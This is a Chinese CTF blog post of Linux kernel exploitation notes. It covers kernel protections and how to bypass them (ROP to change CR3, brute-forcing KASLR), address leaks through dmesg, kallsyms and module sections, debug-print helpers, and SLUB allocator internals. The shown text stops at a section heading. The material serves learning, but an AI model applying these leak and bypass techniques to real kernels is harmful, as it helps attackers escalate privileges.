<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、常见保护                           1.KPTI       在v4.15之后会默认开启 内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码 即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过 Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.co">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel笔记汇总">
<meta property="og:url" content="http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="一、常见保护                           1.KPTI       在v4.15之后会默认开启 内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码 即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过 Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.co">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512151331110.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203251436512.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281447847.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281410940.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281412927.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281706047.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281710474.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281721303.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329193540405.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329205636964.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113641265.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113813160.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330101231165.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171652853.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171342307.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171405407.png">
<meta property="article:published_time" content="2022-01-14T02:25:33.000Z">
<meta property="article:modified_time" content="2022-05-22T09:59:30.056Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="kernel笔记汇总">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png"><title>kernel笔记汇总 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">kernel笔记汇总</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-22</span></span></div></header><div class="post-body">
        <h1 id="一、常见保护"   >
          <a href="#一、常见保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、常见保护" class="headerlink" title="一、常见保护"></a>一、常见保护</h1>
      
        <h2 id="1-KPTI"   >
          <a href="#1-KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-KPTI" class="headerlink" title="1.KPTI"></a>1.KPTI</h2>
      <p>在v4.15之后会默认开启</p>
<p>内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码</p>
<p>即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/devices/system/cpu/vulnerabilities/*</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png" alt="image.png"></p>
<p>这个也有类似的启动脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-SMEP、SMAP、KASLR等"   >
          <a href="#2-SMEP、SMAP、KASLR等" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SMEP、SMAP、KASLR等" class="headerlink" title="2.SMEP、SMAP、KASLR等"></a>2.SMEP、SMAP、KASLR等</h2>
      <p>这个直接看启动脚本</p>

        <h3 id="1-SMEP和SMAP"   >
          <a href="#1-SMEP和SMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMEP和SMAP" class="headerlink" title="(1)SMEP和SMAP"></a>(1)SMEP和SMAP</h3>
      <p>可以通过ROP修改CR3寄存器来绕过</p>

        <h3 id="2-KASLR"   >
          <a href="#2-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-KASLR" class="headerlink" title="(2)KASLR"></a>(2)KASLR</h3>
      <p>通常需要泄露地址，可以通过以下命令查看当前基地址</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep startup_64</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png" alt="image-20220118120655137"></p>
<p>但是也可以爆破，KASLR的随机化程度只有9bit，还是比较好爆破的，参考之后的爆破KASLR的模板</p>

        <h2 id="3-其他保护"   >
          <a href="#3-其他保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他保护" class="headerlink" title="3.其他保护"></a>3.其他保护</h2>
      
        <h3 id="1-STACK-PROTECTOR"   >
          <a href="#1-STACK-PROTECTOR" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-STACK-PROTECTOR" class="headerlink" title="(1)STACK PROTECTOR"></a>(1)STACK PROTECTOR</h3>
      <p>类似用户态的cancary</p>

        <h3 id="2-参考README-MD"   >
          <a href="#2-参考README-MD" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-参考README-MD" class="headerlink" title="(2)参考README.MD"></a>(2)参考README.MD</h3>
      <p>有时候出题人给的README.MD会给配置</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>如上就是使用SLAB分配，开启RANDOM和HARDENED保护，以及Hardened Usercopy（内核空间指针也会进行非常严格的安全性检查，包括不允许为空指针、不允许指向 <code>kmalloc</code> 分配的零长度区域、不允许指向内核代码段、如果指向 Slab 则不允许超过 Slab 分配器分配的长度、如果涉及到栈则不允许超出当前进程的栈空间等等。）和 <code>Static Usermodehelper Path</code>（modprobe_path 为只读，不可修改）</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="二、泄露地址"   >
          <a href="#二、泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、泄露地址" class="headerlink" title="二、泄露地址"></a>二、泄露地址</h1>
      <p>一般是开启KASLR的时候寻找地址</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/" >信息泄漏 - CTF Wiki (ctf-wiki.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-常用方法"   >
          <a href="#1-常用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常用方法" class="headerlink" title="1.常用方法"></a>1.常用方法</h2>
      
        <h3 id="Dmesg"   >
          <a href="#Dmesg" class="heading-link"><i class="fas fa-link"></i></a><a href="#Dmesg" class="headerlink" title="Dmesg"></a>Dmesg</h3>
      <p>显示启动时的一些信息，其中肯定包含很多函数地址</p>
<p>当设置如下即不能再用</p>
<ul>
<li>启动时<code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code>，即设置<code>dmesg_restrict</code>为1</li>
<li>编译内核时<code>CONFIG_SECURITY_DMESG_RESTRICT=y</code>，这个效果等同</li>
</ul>

        <h3 id="kallsyms"   >
          <a href="#kallsyms" class="heading-link"><i class="fas fa-link"></i></a><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h3>
      <p>保存所有函数地址(全局的、静态的)和非栈数据变量地址</p>
<p>当其中的值如下时对应所示情况，一般题目启动时直接</p>
<p><code>echo 2 &gt; /proc/sys/kernel/kptr_restrict</code></p>
<ul>
<li>0：默认情况下，没有任何限制。</li>
<li>1：使用 <code>％pK</code> 输出的内核指针地址将被替换为 0，除非用户具有<code>CAP_ SYSLOG</code>特权，并且 <code>group id</code>和真正的 id 相等。(这个不太懂，root用户就可以看到)</li>
<li>2：使用 <code>％pK</code> 输出的内核指针都将被替换为 0 ，即与权限无关。(root用户也看不到，需要在启动时去掉这个才行)</li>
</ul>

        <h3 id="module"   >
          <a href="#module" class="heading-link"><i class="fas fa-link"></i></a><a href="#module" class="headerlink" title="module"></a>module</h3>
      <p>这个是用来获取模块加载地址的</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/module_name/sections/.text</span><br></pre></td></tr></table></div></figure>

<p>但是当编程时故意将模块隐藏起来的话，就不会被查看到了，下面有讲到。</p>

        <h1 id="三、下载generic版本内核"   >
          <a href="#三、下载generic版本内核" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、下载generic版本内核" class="headerlink" title="三、下载generic版本内核"></a>三、下载generic版本内核</h1>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search linux|grep linux-image</span><br></pre></td></tr></table></div></figure>

<p>肯定不太全，当然不同的apt源对应不同的，所以还是学会自己编译内核最好。</p>
<p>这种方法下载下来没有符号表，可以通过<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来获取符号表</p>

        <h1 id="四、打印地址"   >
          <a href="#四、打印地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、打印地址" class="headerlink" title="四、打印地址"></a>四、打印地址</h1>
      
        <h2 id="1-常规打印"   >
          <a href="#1-常规打印" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常规打印" class="headerlink" title="1.常规打印"></a>1.常规打印</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;0x%lx\n&quot;,leakAddr);</span><br></pre></td></tr></table></div></figure>

<p>有时候不加<code>\n</code>打不出来</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span><br><span class="line">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-gdb式打印"   >
          <a href="#2-gdb式打印" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gdb式打印" class="headerlink" title="2.gdb式打印"></a>2.gdb式打印</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gdbPrint</span><span class="params">(<span class="keyword">size_t</span>* data,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rowLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; len/<span class="number">0x10</span> ; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x\t&quot;</span>,rowLen);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx  &quot;</span>,*data++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx\n&quot;</span>,*data++);</span><br><span class="line">        rowLen = rowLen+<span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"><span class="built_in">memset</span>(data,<span class="string">&#x27;\xaa&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">memset</span>(data+<span class="number">0x10</span>,<span class="string">&#x27;\xbb&#x27;</span>, <span class="number">0x20</span>);</span><br><span class="line">gdbPrint(data,<span class="number">0x50</span>);</span><br></pre></td></tr></table></div></figure>

<p>实现效果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512151331110.png" alt="image-20220512151331110"></p>

        <h2 id="3-颜色打印"   >
          <a href="#3-颜色打印" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-颜色打印" class="headerlink" title="3.颜色打印"></a>3.颜色打印</h2>
      
        <h1 id="五、搜索内存"   >
          <a href="#五、搜索内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、搜索内存" class="headerlink" title="五、搜索内存"></a>五、搜索内存</h1>
      <p>当不知道内存在哪里时，可以使用peda的搜索功能，搜索地址范围，常常在操控栈时很好用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;galf&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png" alt="image-20220114170510292"></p>

        <h1 id="六、常见漏洞及利用"   >
          <a href="#六、常见漏洞及利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、常见漏洞及利用" class="headerlink" title="六、常见漏洞及利用"></a>六、常见漏洞及利用</h1>
      
        <h2 id="1-堆"   >
          <a href="#1-堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆" class="headerlink" title="1.堆"></a>1.堆</h2>
      
        <h3 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3>
      
        <h4 id="分配方式"   >
          <a href="#分配方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#分配方式" class="headerlink" title="分配方式"></a>分配方式</h4>
      <p>通常而言为两种分配方式SLUB或者SLAB，SLUB默认会带上SLAB，但是可以进行设置，比如在编译内核的时候，使用<code>CONFIG_SLUB=n</code>， <code>CONFIG_SLAB=y</code>这样编译出来的内核就一定是SLAB分配的了。</p>

        <h4 id="分配基地址"   >
          <a href="#分配基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#分配基地址" class="headerlink" title="分配基地址"></a>分配基地址</h4>
      <p>kmalloc 从线性映射区分配内存，这块区域的线性地址到物理地址空间的映射是<strong>连续的</strong>，其起始地址为 <code>page_offset_base</code>，在不开启KASLR的情况如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203251436512.png" alt="image-20220325143607447"></p>

        <h4 id="kmalloc-caches"   >
          <a href="#kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc-caches" class="headerlink" title="kmalloc_caches"></a>kmalloc_caches</h4>
      <p>作为一个<code>kmem_cache</code>的结构体数组，管理着多个<code>kmem_cache</code>结构体指针。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png" alt="image-20220313124755307"></p>
<p>但是不同版本下，由于分配方式的不同，导致也会<code>kmalloc_caches</code>的结构有点变化</p>
<p>比如在4.19.98的版本中，<code>kmalloc_caches</code>就只是一维数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png" alt="image-20220313161710623"></p>
<p>而在5.6的版本下，<code>kmalloc_caches</code>变成了二维数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png" alt="image-20220313161749775"></p>
<p>多出来的两个一维空间，就存放了<code>kmalloc-rcl</code>和<code>dma-kmalloc</code>，实际上也是相同的</p>

        <h4 id="SLUB下"   >
          <a href="#SLUB下" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB下" class="headerlink" title="SLUB下"></a>SLUB下</h4>
      <p>通常我们分配的chunk的<code>freelist</code>为<code>kmalloc_caches[xx].cpu_slab.freelist + CPUX_addr</code>，也就是先得到对应CPU分配的基地址，然后加上<code>cpu_slab.freelist </code>即为对应<code>kmalloc-xx</code>的<code>freelist</code>的实际地址，如下图可以看到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png" alt="image-20220316201816364"></p>
<p>这里我在itExp中绑定了使用CPU3进行分配</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cpu_set_t</span> cpu_mask;</span><br><span class="line">CPU_ZERO(&amp;cpu_mask);<span class="comment">//初始化为0</span></span><br><span class="line">CPU_SET(<span class="number">3</span>,&amp;cpu_mask);<span class="comment">//绑定CPU3运行程序</span></span><br><span class="line">sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_mask), &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>


        <h5 id="一维kmalloc-caches"   >
          <a href="#一维kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#一维kmalloc-caches" class="headerlink" title="一维kmalloc_caches"></a>一维kmalloc_caches</h5>
      <p><code>kmalloc_caches[1]~kmalloc_caches[13]</code>为<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p>而在只有一维空间的<code>kmalloc_caches</code>中，即不存在<code>kmalloc-rcl</code>和<code>dma-kmalloc</code>的版本下，比如4.19.98</p>
<p>如下图可以看到，也是很顺利地放入CPU3对应的<code>kmalloc-32</code>的<code>freelist</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png" alt="image-20220314122243323"></p>
<p>但是CPU个数的不同，分配的基地址通常也会发生变化，这个具体还是看<code>__per_cpu_offset</code>这个全局变量中保存的内容吧，具体的细节不太知道</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png" alt="image-20220316201020862"></p>
<p>如图为4个CPU的情况，这个还是不太一样的。</p>

        <h5 id="多维kmalloc-caches"   >
          <a href="#多维kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#多维kmalloc-caches" class="headerlink" title="多维kmalloc_caches"></a>多维kmalloc_caches</h5>
